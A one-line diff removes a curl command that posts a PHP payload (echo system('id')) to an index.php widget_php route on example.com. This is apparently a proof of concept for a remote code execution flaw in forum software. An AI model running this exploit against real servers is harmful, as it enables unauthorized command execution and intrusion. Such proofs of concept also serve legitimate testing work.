@@ -1,1 +1,0 @@
-curl https://example.com/index.php\?routestring\=ajax/render/widget_php --connect-timeout 5 --max-time 15 -s -k --data "widgetConfig[code]=echo system('id');exit;"
